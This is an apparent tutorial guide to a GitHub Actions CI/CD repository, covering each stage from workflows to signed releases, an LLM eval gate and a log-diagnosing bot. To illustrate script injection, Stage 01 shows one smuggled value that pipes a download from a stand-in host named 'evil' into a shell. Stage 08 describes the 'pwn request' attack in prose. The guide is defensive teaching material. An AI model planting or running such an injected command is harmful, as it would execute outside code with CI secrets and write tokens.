# PipelineDoctor - Learning Guide

A guided tour of CI/CD on GitHub Actions for a DevOps / AIOps learner. The repository is the
textbook: ten commits tagged `stage-01` ... `stage-10`, each adding one topic. For every stage
this guide gives you **the concept**, **the files and the lines that matter** (short excerpts,
not whole files), and **what to look at on GitHub**.

Companion documents:

* [COMMANDS.md](COMMANDS.md) - every command in this guide, ready to copy into PowerShell.
* [TECH-STACK.md](TECH-STACK.md) - tools and exact versions.
* [docs/stages/](docs/stages/) - the reference page per stage (more detail, exercises).
* [ARCHITECTURE.md](ARCHITECTURE.md) - the full design.

---

## 0. Before you start

### Current state of the repository (October 2026)

| Item | State | What it means for you |
|---|---|---|
| Release | **v0.2.0** exists (`gh release view v0.2.0`), signed multi-arch images in GHCR | You can verify signatures and provenance yourself (stage 07) |
| Workflows on `main` | all green | Any red run you see is on a PR branch, usually on purpose |
| Demo PR **#5** (draft) | `test(demo): break test on purpose` - Demo CI is red | Watch the doctor comment on it (stage 08) |
| Demo PR **#8** | `feat(prompts): diagnose.v2 ...` - a prompt change | Watch the eval gate and its score table (stage 06) |
| Secret `OPENROUTER_API_KEY` | **not set yet** | The eval gate reports **NEUTRAL** (cases `skipped_no_key`) and the doctor writes a **rule-based** diagnosis. See section 6.4 |
| Self-hosted runner `pd-prod` | **not registered yet** | Production deploy jobs wait for a runner. See stage 09 |

### How to step through the stages

```powershell
git fetch --tags
git tag -l "stage-*"                       # stage-01 ... stage-10
git switch --detach stage-03               # the repo exactly as it was at stage 03
git diff --stat stage-02 stage-03          # which files the stage touched
git diff stage-02 stage-03 -- .github/workflows/ci.yml   # what changed in one file
git show stage-03:.github/workflows/ci.yml # read a file as it was at that stage
git switch main                            # back to today
```

Some stages are large (stage 02 adds the whole engine, stage 06 the eval dataset). Always start
with `--stat`, then diff only the workflow files: `git diff stage-05 stage-06 -- .github/`.

### The vocabulary of GitHub Actions in one picture

```
repository
└── .github/workflows/ci.yml           WORKFLOW  = one YAML file; started by an EVENT (on:)
    └── jobs:
        ├── changes                     JOB       = runs on its own fresh RUNNER (a VM)
        │   └── steps:                  STEP      = one shell command (run:) or one ACTION (uses:)
        │       ├── uses: actions/checkout@<sha>    ACTION = reusable step published in a repo
        │       └── run: echo hello
        └── ci-ok   needs: [changes]    needs: = ordering + access to the other job's outputs
```

* A **run** is one execution of a workflow; each run has jobs, each job has steps and logs.
* Jobs run **in parallel** unless `needs:` connects them. They **do not share a disk**: pass
  small strings as job outputs and files as artifacts.
* An **action** is code someone else wrote (`uses: owner/repo@ref`). A **reusable workflow**
  is a whole workflow called as a job (stage 10).

---

## Stage 01 - Hello workflow: events, jobs, steps, outputs

`git switch --detach stage-01` · file: `.github/workflows/hello.yml`

### Concept

The smallest useful workflow. It answers: what starts a run (event), where does it run
(runner), how do two jobs hand data to each other (outputs), and how does a run report to a
human (step summary, annotations).

### Important lines

```yaml
on:
  push:
    branches: [main]          # event 1: a push to main
  workflow_dispatch:          # event 2: the "Run workflow" button / gh workflow run
    inputs:
      who:
        type: string
        default: learner
```

```yaml
permissions: {}               # least privilege: this workflow's GITHUB_TOKEN can do nothing
```

```yaml
    outputs:
      greeting: ${{ steps.compose.outputs.greeting }}   # job output, read by the next job
    ...
      - name: Compose a greeting
        id: compose
        env:
          WHO: ${{ inputs.who || 'learner' }}          # expression -> env var, NOT into the script
        run: |
          echo "greeting=${greeting}" >> "$GITHUB_OUTPUT"   # how a step sets an output
```

```yaml
  report:
    needs: greet                                         # wait for greet, read its outputs
    ...
        env:
          GREETING: ${{ needs.greet.outputs.greeting }}
```

Why `env:` instead of `run: echo "${{ inputs.who }}"`? `${{ }}` is substituted into the script
text **before** bash runs. If the value comes from a user (a branch name, a PR title, an input),
it can contain `"; curl evil | sh; "`. Through `env:` it is just data. This is **script
injection**, and policy rule R6 (stage 05) forbids the unsafe form everywhere.

`echo "::notice title=Hello::..."` and `::group::` are **workflow commands**: special stdout
lines the runner turns into annotations and collapsible log groups. Markdown appended to
`$GITHUB_STEP_SUMMARY` appears on the run page.

### What to observe on GitHub

* Actions tab -> **Hello** -> "Run workflow" (the `workflow_dispatch` input appears as a form).
* The run graph shows `greet -> report` (because of `needs`).
* The summary table and the "Hello" notice on the run page.

---

## Stage 02 - Quality gates and rulesets

`git diff --stat stage-01 stage-02` · files: `.github/workflows/ci.yml` (stage-02 version),
`src/pipelinedoctor/**`, `tests/**`, `pyproject.toml`, `uv.lock`, `.github/rulesets/main.json`

### Concept

A **quality gate** is a check that turns red on purpose when quality drops: lint, formatting,
types, tests, coverage. The PR cannot merge while a *required* gate is red. Which checks are
required is decided by a **ruleset** (modern branch protection).

### Important lines

```powershell
git show stage-02:.github/workflows/ci.yml
```

Look for these commands in the jobs:

```yaml
- run: uv sync --frozen        # install EXACTLY uv.lock, fail if it is stale
- run: uv run --frozen ruff check --output-format=github src tests   # findings -> inline PR annotations
- run: uv run --frozen ruff format --check --diff src tests
- run: uv run --frozen mypy src                                      # strict = true in pyproject.toml
- run: |
    uv run --frozen pytest --cov=pipelinedoctor --cov-report=xml --cov-report=term \
      ...                                                            # with a coverage floor (85 %)
```

The aggregate job (same idea in today's `ci.yml`):

```yaml
  ci-ok:
    needs: [changes, engine, console]
    if: always()           # run even if a needed job failed or was skipped
    ...
          for r in "$CHANGES" "$ENGINE" "$CONSOLE"; do
            if [ "$r" = failure ] || [ "$r" = cancelled ]; then exit 1; fi
          done
```

Branch protection requires only **`ci-ok`**, not `test (ubuntu-latest, 3.12)` etc. When the
matrix grows later, the protection rules do not need to change.

`.github/rulesets/main.json` (applied after stage 10 by `scripts/apply-ruleset.ps1`):

```json
{ "type": "pull_request", "parameters": { "required_approving_review_count": 0,
  "allowed_merge_methods": ["squash"] } },
{ "type": "required_status_checks", "parameters": { "required_status_checks": [
  { "context": "ci-ok", "integration_id": 15368 },
  { "context": "eval-gate", "integration_id": 15368 }, ... ] } }
```

`integration_id: 15368` is the GitHub Actions app: a status called `ci-ok` posted by anyone
else (a script with a token) does not satisfy the rule.

### What to observe on GitHub

* Any PR -> "Checks" tab: lint, typecheck, test run **in parallel**.
* Settings -> Rules -> Rulesets -> `main-protection` (enforcement *active*).
* A direct `git push origin main` is rejected: everything goes through a PR (even these docs).

---

## Stage 03 - Speed: caching, matrix, path filters, concurrency, timeouts

`git diff stage-02 stage-03 -- .github/workflows/` · files: `ci.yml`, `demo-ci.yml`, `demo/**`

### Concept

A slow pipeline is a pipeline people work around. Five techniques:

| Technique | Idea |
|---|---|
| **Cache** | Restore downloaded dependencies keyed by a hash of the lock file |
| **Matrix** | One job definition, N combinations (OS x Python) |
| **Path filter** | Skip work that the change cannot affect |
| **Concurrency** | A new push to a PR cancels the outdated run |
| **Timeouts** | A hung job costs minutes, not the 6-hour default |

### Important lines

Caching - `setup-uv` caches uv's download cache, keyed by the hash of `uv.lock`:

```yaml
- uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
  with:
    version: "0.12.21"
    enable-cache: true
```

Matrix (stage-03 `ci.yml`):

```yaml
    strategy:
      fail-fast: false            # one red leg does not cancel the others
      matrix:
        os: [ubuntu-latest, windows-latest]
        python: ["3.11", "3.12"]
        exclude:
          - os: windows-latest    # 3 legs instead of 4: Windows only on the newest Python
            python: "3.11"
```

Concurrency (same block in almost every workflow):

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}   # never cancel main
```

Path filter **inside** the workflow (`dorny/paths-filter` job + `if:` on the expensive job):

```yaml
  engine:
    needs: changes
    if: needs.changes.outputs.engine == 'true'
```

**The trap:** `on.pull_request.paths:` skips the *whole workflow*. A required check that never
starts stays "Expected - waiting for status" forever and blocks the merge. A *skipped job*
counts as passed. So `ci.yml` (required) filters at job level; `demo-ci.yml` (not required) may
use `on.paths`.

### What to observe on GitHub

* Logs of the `setup-uv` step: `Cache restored from key: setup-uv-...` vs `No GitHub Actions cache found`.
* Actions -> Caches (or `gh cache list`).
* Push twice to a PR within seconds: the first run shows *"Canceling since a higher priority
  waiting request ... exists"*.
* The PR checks list shows `engine / test (windows-latest, 3.12)` etc. - one check per matrix leg.

---

## Stage 04 - Container builds: Buildx, GHA cache, GHCR

`git diff --stat stage-03 stage-04` · files: `.github/workflows/container.yml`, `Dockerfile`,
`console/Dockerfile`, `deploy/proxy/Dockerfile`

### Concept

Build three images (engine, console, proxy) with **Buildx/BuildKit**, cache layers in the
GitHub Actions cache, tag them traceably, and push to **GHCR** (GitHub Container Registry,
`ghcr.io`) using the job's own token - no registry password.

### Important lines

Multi-stage `Dockerfile`: dependencies are installed from the lock file in a layer of their own,
so editing code does not re-download them:

```dockerfile
FROM python:3.12.14-slim@sha256:f77ac9e4... AS builder
RUN --mount=type=cache,target=/root/.cache/uv \
    --mount=type=bind,source=uv.lock,target=uv.lock \
    uv sync --frozen --no-dev --no-install-project --no-editable
...
FROM python:3.12.14-slim@sha256:f77ac9e4... AS runtime
COPY --from=builder /app/.venv /app/.venv      # only the finished venv reaches the final image
```

Tags from `docker/metadata-action`:

```yaml
          tags: |
            type=sha,format=short,prefix=sha-     # sha-1a2b3c4: immutable, traceable to a commit
            type=edge,branch=main                 # edge: "latest main"
            type=semver,pattern={{version}},value=${{ inputs.version }},enable=${{ inputs.version != '' }}
            type=raw,value=latest,enable=${{ inputs.version != '' }}
```

Layer cache, one scope per image so they do not evict each other:

```yaml
          cache-from: ${{ !inputs.sign && format('type=gha,scope={0}', matrix.image) || '' }}
          cache-to: type=gha,mode=max,scope=${{ matrix.image }}
```

Push policy: PRs build without pushing (proves the Dockerfile works); `main` pushes with
`packages: write` on the job and `docker/login-action` using `secrets.GITHUB_TOKEN`.

### What to observe on GitHub

* The `Container` run on a PR: `build (engine)`, `build (console)`, `build (proxy)`, no push.
* In the build log: `CACHED` next to unchanged layers.
* Profile -> Packages: `pipelinedoctor`, `pipelinedoctor-console`, `pipelinedoctor-proxy`.

---

## Stage 05 - Security: least privilege, SHA pins, scanners, workflow policy

`git diff stage-04 stage-05 -- .github/ scripts/` · files: `security.yml`, `codeql.yml`,
`.github/dependabot.yml`, `.gitleaks.toml`, `trivy.yaml`, `scripts/check_workflows.py`

### Concept

CI has secrets, write tokens and runs on every PR, so it is an attack surface. Defence in layers:

| Layer | Tool | Required check |
|---|---|---|
| Secrets in commits | gitleaks 8.30.1 | `secret-scan` |
| Vulnerable new dependencies | `actions/dependency-review-action` | `dependency-review` |
| Vulnerable files / images | Trivy v0.75.0 -> SARIF -> Security tab | - |
| Code flaws | CodeQL (python, javascript-typescript, **actions**) | - |
| Workflow mistakes | actionlint 1.7.12, zizmor 1.30.1, `check_workflows.py` | `workflow-policy` |
| Outdated pins | Dependabot (weekly, 14-day cooldown) | - |

### Least privilege

Every workflow starts with no token permissions; each job asks only for what it needs, with a
comment saying why:

```yaml
permissions: {}                       # workflow level

jobs:
  diagnose:
    permissions:
      actions: read        # read the failed run, its jobs and logs
      contents: read       # checkout of the default branch
      pull-requests: write # upsert the diagnosis comment
```

The repository default for `GITHUB_TOKEN` is also read-only (`scripts/repo-settings.ps1`).

### SHA-pinned actions

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

A tag like `v7` is a movable pointer: whoever controls the action's repository can point it at
malicious code, and your next run executes it with your secrets. A 40-character commit SHA
cannot be moved. The `# v7.0.1` comment keeps it readable, and Dependabot updates SHA and
comment together. The repo also applies a **two-week rule** (`exclude-newer = "2 weeks"` in
`pyproject.toml`, `cooldown: default-days: 14` in Dependabot): fresh releases are when a
compromised version is most likely to slip through.

### The workflow policy (`scripts/check_workflows.py`, part of `workflow-policy`)

R1 `permissions: {}` + per-job permissions · R2 SHA pins · R3 `self-hosted` only in the two
production jobs · R4 no `pull_request_target` · R5 `timeout-minutes` everywhere · R6 no
`${{ github.event.* }}` inside `run:` · R7 `persist-credentials: false` on checkout · R8
`workflow_run` workflows never check out the triggering run's head.

### What to observe on GitHub

* Security tab -> Code scanning: Trivy and CodeQL results, one *category* per scan.
* Pull requests opened by **Dependabot** (e.g. #4 actions bump, #10 docker bump): grouped,
  Conventional-Commit titles `chore(deps): ...`.
* A PR's checks list: `secret-scan`, `dependency-review`, `workflow-policy`.

---

## Stage 06 - The LLMOps eval gate

`git diff stage-05 stage-06 -- .github/workflows/ evals/thresholds.yaml` · files: `evals.yml`,
`nightly-evals.yml`, `evals/**`, `src/pipelinedoctor/evals/**`, `docs/evals.md`

### 6.1 Concept: code tests vs LLM evals

| | Code tests (`pytest`) | LLM evals (`pipelinedoctor eval`) |
|---|---|---|
| Question | Does the code do what it says? | Does the *model + prompt* still give good answers? |
| Input | fixtures, fakes (the LLM is mocked) | 30 realistic failure logs with expected category and key facts |
| Result | pass / fail, deterministic | scores (accuracy, recall, ...) compared to thresholds |
| Breaks when | code changes | the prompt, the model or the parser changes - even if all tests are green |
| Cost | free, seconds | real API calls, rate-limited, cached |

A prompt edit can silently make diagnoses worse while every unit test stays green. Evals are
the test suite for behaviour.

### 6.2 Thresholds (`evals/thresholds.yaml`)

```yaml
pr:
  category_accuracy: 0.80   # right failure category
  evidence_validity: 0.90   # cited log lines really exist in the log
  key_fact_recall: 0.65     # the diagnosis mentions the key facts
  secret_leak_free: 1.0     # no secret ever appears in the output
  llm_coverage: 0.60        # share answered by the LLM, not the rule fallback
  max_latency_p95_ms: 90000
  min_scored_ratio: 0.90
nightly:
  ...
  judge_score_mean: 3.5     # LLM-as-judge, nightly only
```

### 6.3 The PR workflow (`evals.yml`)

```
changes (paths-filter: prompts/, src/pipelinedoctor/, evals/, pyproject.toml, uv.lock)
   └── eval (only if changed): restore cache -> 10 cases -> save cache -> gate -> PR comment -> artifact
         └── eval-gate (always) = the required check
```

Important lines:

```yaml
    env:
      HAS_KEY: ${{ secrets.OPENROUTER_API_KEY != '' }}   # a boolean, the key itself is not exposed
    ...
          if [ "$HAS_KEY" = "true" ]; then mode=live; else mode=cache-only; fi
          uv run --frozen pipelinedoctor eval run --subset pr --llm "$mode" \
            --cache-dir .eval-cache --max-requests 12 --output eval-results/result.json
```

```yaml
      - name: Gate against thresholds
        id: gate
        continue-on-error: true      # let the comment + artifact steps still run
      ...
      - name: Fail if the gate failed
        if: steps.gate.outcome == 'failure'
        run: exit 1                  # turn a failed gate into a red job at the very end
```

**Result cache.** Each case's result is stored under
`sha256(case + log + prompt version + prompt sha256 + models + engine fingerprint)`. Unchanged
cases are not re-asked. The directory is persisted with `actions/cache`:

```yaml
          key: pd-evals-v1-${{ github.run_id }}-${{ github.run_attempt }}   # caches are immutable: always a new key
          restore-keys: pd-evals-v1-                                        # restore the newest one
```

Cache scope = cache-poisoning protection: a PR can read caches saved on `main` (by the nightly
run), but `main` never reads a PR's cache and PRs cannot read each other's.

**Budget guard.** OpenRouter's free tier allows roughly 50 requests/day and 20/minute. So: at
most 2 LLM calls per case (primary model, one fallback), `--max-requests 12` on PRs and 45
nightly, spacing between calls. A case that would exceed the budget is marked
`skipped_budget`; `min_scored_ratio` makes sure the gate does not pass on too few cases.

**Nightly (`nightly-evals.yml`, `cron: "17 3 * * *"`).** All 30 cases with `--no-cache-read`:
free models can change behind the same name, so the nightly run always asks the model and
detects **drift**. The `record` job appends one JSON line to `ledger.jsonl` on the orphan
branch `eval-history` - the only job in the repo whose checkout keeps credentials
(`contents: write`, `persist-credentials: true`), and it uses no secrets.

### 6.4 Why you see NEUTRAL right now (secret not set)

The gate has three outcomes: `pass`, `fail`, `neutral`.

* `OPENROUTER_API_KEY` is **not configured** in the repository yet, so `HAS_KEY` is `false` and
  the eval job runs `--llm cache-only`.
* Every case that is not in the cache gets the status **`skipped_no_key`**.
* The gate then reports **NEUTRAL** with *"Evals skipped: OPENROUTER_API_KEY not available"*
  and exits 0. The `eval` job and the required `eval-gate` check are therefore **green**, and the
  score table on PR #8 says NEUTRAL instead of showing real scores.
* Why neutral and not red? Fork PRs and Dependabot PRs never get secrets. Failing them would
  block every outside contribution; the nightly run on `main` is the safety net.
* Why neutral and not green-pass? An honest gate never claims a pass it did not measure.

**After the secret is set** (`gh secret set OPENROUTER_API_KEY`, see COMMANDS.md section 7):
`HAS_KEY` becomes `true`, the mode becomes `live`, the 10 PR cases call the model (cache misses
only), the table shows real scores, and `eval-gate` turns **red** if any threshold is missed.
Re-run the Evals workflow on PR #8 to see it: the v2 prompt is then measured against the
thresholds. The doctor (stage 08) switches from rule-based to LLM diagnoses at the same moment.

### What to observe on GitHub

* PR #8 -> the comment with the eval score table (now NEUTRAL; real numbers once the key exists).
* PR #8 -> checks `eval` and `eval-gate`; the job summary of `eval`.
* The run's artifact `eval-results` (`result.json`, `gate.md`).
* Branch `eval-history` -> `ledger.jsonl` (after nightly runs).

---

## Stage 07 - Releases and supply-chain security

`git diff stage-06 stage-07` · files: `release.yml`, `pr-title.yml`, `container.yml`,
`release-please-config.json`, `.release-please-manifest.json`

### Concept

**Conventional Commits** (`feat:`, `fix:`, `docs:` ...) make version numbers automatic.
**release-please** turns them into a release PR, a tag, a GitHub Release and a CHANGELOG. The
release builds **multi-arch** images and attaches proof of what they are (**SBOM**) and how they
were built (**provenance**), and signs them (**cosign**).

| Commit type | Bump before 1.0 (`bump-minor-pre-major`) |
|---|---|
| `fix:` | 0.2.0 -> 0.2.1 |
| `feat:` | 0.2.0 -> 0.3.0 |
| `docs:`, `ci:`, `chore:` | no release |

`pr-title.yml` enforces the format on PR titles; squash merge makes the title the commit message.

### Important lines

```yaml
  release-please:
    concurrency:
      group: release-please          # job-level group, NOT workflow-level (see comment in file)
    permissions:
      contents: write                # create tags and releases
      pull-requests: write           # open/update the release PR
    outputs:
      release_created: ${{ steps.rp.outputs.release_created }}

  images:
    if: needs.release-please.outputs.release_created == 'true'
    uses: ./.github/workflows/container.yml     # reusable workflow call
    permissions:
      packages: write
      id-token: write                # OIDC token -> keyless signing
      attestations: write            # store SLSA provenance
    with:
      platforms: linux/amd64,linux/arm64        # buildx + QEMU: one tag, two architectures
      sign: true
```

In `container.yml` when `sign: true`:

```yaml
uses: anchore/sbom-action@... # v0.24.2           -> sbom-<image>.spdx.json   (WHAT is inside)
cosign sign --yes "$REF"                           -> signature                 (WHO built it)
cosign attest --yes --type spdxjson --predicate "sbom-${IMAGE}.spdx.json" "$REF"
uses: actions/attest-build-provenance@... # v4.2.2 -> SLSA provenance          (HOW/WHERE built)
cosign verify "$REF" --certificate-identity-regexp '^https://github\.com/gagan046-dev/pipelinedoctor/\.github/workflows/container\.yml@refs/heads/main$' ...
```

**Keyless** signing: `id-token: write` lets the job get an OIDC token from GitHub; Sigstore
exchanges it for a 10-minute certificate whose identity is *this workflow file on main of this
repo*. There is no private key to steal. Release builds do not read the layer cache, so a
poisoned cache entry can never end up inside a signed image.

Note: the release PR is opened by `github-actions[bot]`; its checks are held as
*action_required* until someone approves them (see `docs/stages/07-releases.md`).

### What to observe on GitHub

* Releases -> **v0.2.0**: notes from the CHANGELOG plus `*.spdx.json` SBOM assets.
* Packages -> `pipelinedoctor-console` -> tags `0.2.0`, `0.2`, `latest`, `edge`, `sha-...`;
  each tag has two platforms.
* Verify yourself: `gh attestation verify oci://ghcr.io/gagan046-dev/pipelinedoctor-console:0.2.0 -R gagan046-dev/pipelinedoctor`.

---

## Stage 08 - PipelineDoctor itself: `workflow_run` + Docker action

`git diff stage-07 stage-08` · files: `.github/workflows/doctor.yml`, `action.yml`,
`src/pipelinedoctor/engine/**`

### Concept

When a watched workflow finishes, GitHub fires a **`workflow_run`** event. `doctor.yml` reacts:
it downloads the failed job's logs, cleans and redacts them, pre-classifies them with rules,
asks an LLM (max 2 models), validates the JSON answer and its cited log lines, and upserts one
comment on the PR.

### Important lines

```yaml
on:
  workflow_run:
    workflows: [CI, Demo CI, Container, Security, CodeQL, Evals, Nightly Evals, Release, Deploy, Rollback]
    types: [completed]              # names (the "name:" field), not file names

jobs:
  diagnose:
    if: contains(fromJSON('["failure","timed_out","startup_failure"]'), github.event.workflow_run.conclusion)
```

```yaml
      # Trusted code only: the default branch, not github.event.workflow_run.head_sha.
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          ref: ${{ github.event.repository.default_branch }}
          persist-credentials: false
      - uses: astral-sh/setup-uv@... # v10.2.0
        with:
          enable-cache: false        # no cache restore in a job that holds secrets
```

```yaml
        env:
          GITHUB_TOKEN: ${{ github.token }}
          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}   # empty -> rule-based report
          RUN_ID: ${{ github.event.workflow_run.id }}
        run: |
          uv run --frozen --no-dev pipelinedoctor diagnose --repo "$GITHUB_REPOSITORY" --run-id "$RUN_ID" \
            --comment auto --output diagnosis.json --excerpt-output excerpt.txt
```

### Why the doctor never checks out PR code

This is the most important security lesson of the repository.

* A `pull_request` run from a fork gets a **read-only token and no secrets**. That is the safe
  default: the PR author's code runs, but it cannot steal anything.
* A `workflow_run` run is different: it always runs the **default-branch version** of
  `doctor.yml`, in the context of the **base repository**, with **secrets** and a token that can
  **write PR comments** - even when the failed run came from a fork.
* If the doctor checked out `github.event.workflow_run.head_sha` (the PR's code) and ran
  anything from it - `uv sync` of a modified `pyproject.toml`, a test, a script, a build hook -
  the attacker's code would run *with* those secrets and that write token. That is the classic
  "pwn request".
* So the doctor checks out **only the default branch** (already reviewed code), downloads the
  failed run's logs through the REST API **as data**, never executes them, passes event fields
  via `env:` (branch names and titles are attacker-controlled), and treats the log text as
  **untrusted LLM input**: fenced with a random nonce, redacted, instructions inside it ignored.
  Policy rule R8 makes this a required check.

`workflow_run` limits: it only fires for workflow files on the default branch, and when a
workflow file is invalid GitHub may not know its `name:`, so the doctor may not fire (demo mode
`yaml`).

Reuse in other repos: `action.yml` is a Docker action running
`docker://ghcr.io/gagan046-dev/pipelinedoctor:<version>`; see
`docs/examples/consumer-workflow.yml`.

### What to observe on GitHub

* PR **#5** (draft): Demo CI's `quality / test` and `docker` jobs are red (a real
  `apply_tax` rounding bug, `assert Decimal('4.19') == Decimal('4.20')`).
* Actions -> **Doctor**: a run named `Doctor: Demo CI #<n>` started by `workflow_run`.
* PR #5 conversation: **one** PipelineDoctor comment (hidden marker
  `<!-- pipelinedoctor:report v1 -->`), updated - not duplicated - on later pushes. Without the
  secret its source is **rules**; after you set the secret and re-run, it becomes an LLM
  diagnosis with cited log lines.
* The Doctor run's artifact `pipelinedoctor-diagnosis` (`diagnosis.json`, `excerpt.txt`).

---

## Stage 09 - Continuous delivery: environments, staging, blue-green, rollback

`git diff --stat stage-08 stage-09` · files: `deploy.yml`, `resolve-release.yml`,
`rollback.yml`, `deploy/**`, `runner/**`, `scripts/setup-environments.ps1`

### Concept

```
release.yml ──workflow_call──▶ deploy.yml
   resolve     (hosted)  tag -> digest, cosign verify, gh attestation verify
   staging     (hosted)  docker compose up -> smoke -> down          environment: staging
   production  (laptop)  approval -> blue-green -> smoke -> rollback? environment: production
```

* **Environment**: a named deployment target with its own protection rules and secrets.
  `staging` has no reviewer; `production` has a **required reviewer** (`gagan046-dev`) and
  only accepts `main` and `v*` tags. A job with `environment: production` pauses at
  *"Waiting for review"* until approved.
* **Digests, not tags**: `resolve` turns `pipelinedoctor-console:0.2.0` into
  `...@sha256:...` after verifying signature + provenance; staging and production run exactly
  those bytes.
* **Blue-green**: start the idle colour, health-check it, switch nginx (`nginx -s reload`, no
  dropped connections), smoke test; on failure switch back automatically.
* **Self-hosted runner**: production is the laptop, reached through an outbound long-poll
  runner container labelled `pd-prod`.

### Important lines

```yaml
  production:
    needs: [resolve, staging]                  # only through a green staging job
    if: inputs.environment == 'production' && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v'))
    runs-on: [self-hosted, pd-prod]            # the laptop runner (policy R3)
    environment:
      name: production                         # required reviewer -> manual approval
      url: http://127.0.0.1:8090
    concurrency:
      group: deploy-production                 # one production deploy at a time
      cancel-in-progress: false
```

```yaml
        run: docker compose -p pd-staging -f deploy/compose.staging.yml up -d --wait   # ephemeral staging
        ...
        if: always()
        run: docker compose -p pd-staging -f deploy/compose.staging.yml down -v        # always torn down
```

Self-hosted runner on a **public** repo: anyone can open a PR, so the label is allowed only in
`deploy.yml/production` and `rollback.yml/rollback`, neither has a PR trigger, both need the
production approval (policy R3, required check).

**Current state:** the runner is **not registered yet**. Until it is, a production job stays
*queued* ("Waiting for a runner to pick up this job") even after approval. Register it with
`docs/self-hosted-runner.md` (COMMANDS.md section 7). The production environment also records
GitHub **Deployments**, which the Console turns into **DORA metrics**.

### What to observe on GitHub

* Settings -> Environments: `staging`, `production` (required reviewer, branch/tag policy).
* A Deploy run: `resolve` -> `staging` green -> `production` "Waiting for review" -> after
  approval, "Waiting for a runner" until the laptop runner is online.
* Repo home -> Deployments.

---

## Stage 10 - Reuse: reusable workflow, composite action, templates

`git diff stage-09 stage-10 -- .github/` · files: `reusable-python-ci.yml`,
`.github/actions/setup-python-env/action.yml`, `CODEOWNERS`, `pull_request_template.md`,
`ISSUE_TEMPLATE/**`

### Concept

| | Composite action | Reusable workflow |
|---|---|---|
| Called as | a **step** (`- uses: ./.github/actions/setup-python-env`) | a **job** (`jobs.engine.uses: ./.github/workflows/reusable-python-ci.yml`) |
| Runs | inside the caller's job, same VM | its own jobs, runners, matrix |
| Trigger | - | `on: workflow_call` with typed `inputs`, `secrets`, `outputs` |

### Important lines

Caller (`ci.yml`) - a job with `uses:` has no steps:

```yaml
  engine:
    uses: ./.github/workflows/reusable-python-ci.yml
    permissions:
      contents: read                 # the called workflow can never get MORE than this
    with:
      coverage-min: 85
      matrix: '{"os":["ubuntu-latest","windows-latest"],"python":["3.11","3.12"],"exclude":[{"os":"windows-latest","python":"3.11"}]}'
```

Callee (`reusable-python-ci.yml`):

```yaml
    strategy:
      matrix: ${{ fromJSON(inputs.matrix) }}     # matrix passed in as a JSON string
```

Composite action - `using: composite`, each step needs an explicit `shell:`; the same action
switches between uv and pip and their caches:

```yaml
        cache: ${{ inputs.installer == 'pip' && 'pip' || '' }}   # "a && b || c" = ternary
```

### What to observe on GitHub

* Check names like `engine / test (ubuntu-latest, 3.12)` (caller job / callee job).
* New PRs get the PR template and an automatic review request from CODEOWNERS.
* New issue -> the bug form (no blank issues).

---

## Cross-cutting topics (quick reference)

### Triggers used in this repo

| Trigger | Example | Notes |
|---|---|---|
| `push` | `ci.yml`, `release.yml` on `main` | `branches:`, `paths:` filters |
| `pull_request` | `ci.yml`, `evals.yml`, `pr-title.yml` | fork PRs: read-only token, no secrets |
| `workflow_run` | `doctor.yml` | runs default-branch code with secrets: never run PR code |
| `schedule` | nightly evals `17 3 * * *`, CodeQL weekly, Security weekly | cron in UTC, only on the default branch |
| `workflow_dispatch` | `hello.yml`, `deploy.yml`, `rollback.yml`, `nightly-evals.yml` | manual, with typed inputs |
| `workflow_call` | `container.yml`, `deploy.yml`, `resolve-release.yml`, `reusable-python-ci.yml` | makes a workflow reusable |
| *not used:* `pull_request_target` | forbidden by policy R4 | runs with secrets in the base context |

### Dependabot

`.github/dependabot.yml` watches uv, pip, docker, npm and github-actions; weekly on Monday,
grouped into one PR per ecosystem, `cooldown: default-days: 14`, commit prefix `chore(deps)`.
Major runtime jumps (Python minor/major, Node major, Postgres major) are ignored on purpose:
they are deliberate changes with a matrix update. Dependabot PRs get **no secrets**, so their
eval gate is NEUTRAL by design.

### Rulesets

`main-protection`: PR required (squash only, 0 approvals, conversations resolved), no
force-push, no deletion, six required checks pinned to the GitHub Actions app. Admins may
bypass **only through a PR**, so even the owner cannot push to `main` directly.

---

## Glossary

| Term | Meaning |
|---|---|
| **Action** | A reusable step (`uses: owner/repo@ref`): JavaScript, Docker or composite |
| **actionlint** | Linter for workflow syntax, expressions and shell in `run:` blocks |
| **Annotation** | A message attached to a run or a line of a file (`::error::`, `::notice::`, ruff GitHub output) |
| **Artifact** | Files uploaded by a job (`upload-artifact`), downloadable from the run, used between jobs |
| **Attestation** | A signed statement about an artifact (SBOM, provenance), verifiable with `gh attestation verify` |
| **Blue-green** | Two copies (blue, green); deploy to the idle one, switch traffic, switch back on failure |
| **Budget guard** | Hard cap on LLM requests per run (`--max-requests`), extra cases marked `skipped_budget` |
| **Buildx / BuildKit** | Docker's modern builder: parallel stages, cache export, multi-arch |
| **Cache (actions/cache)** | Key-addressed, immutable storage of files between runs; scoped by branch |
| **CODEOWNERS** | File that auto-requests reviews from owners of paths |
| **Composite action** | An action made of steps, run inside the caller's job |
| **Concurrency group** | At most one running (and one pending) run per group; optional cancel-in-progress |
| **Conventional Commits** | `type(scope)!: summary` messages that drive versioning |
| **cosign / Sigstore** | Tooling to sign and verify container images; keyless mode uses OIDC |
| **DORA metrics** | Deployment frequency, lead time, change failure rate, time to restore |
| **Digest** | `sha256:...` content address of an image; unlike a tag it cannot move |
| **Drift** | Model behaviour changing behind the same model name; caught by the nightly run |
| **Environment** | Deployment target with protection rules (reviewers, branch policy) and secrets |
| **Eval / eval gate** | Scored test of LLM behaviour on a dataset; the gate compares scores to thresholds |
| **Event / trigger** | What starts a workflow (`on:`) |
| **Expression** | `${{ ... }}`, evaluated by GitHub before the step runs |
| **fail-fast** | Matrix setting: cancel other legs when one fails (`false` here) |
| **GHCR** | GitHub Container Registry, `ghcr.io/<owner>/<image>` |
| **GITHUB_TOKEN** | Short-lived per-job token; its scopes come from `permissions:` |
| **gitleaks** | Scanner for secrets in git history |
| **Job** | A set of steps on one runner; jobs are parallel unless `needs:` links them |
| **Job output** | Small string passed from one job to dependent jobs |
| **Least privilege** | Grant only the permissions a job needs (`permissions: {}` + per-job scopes) |
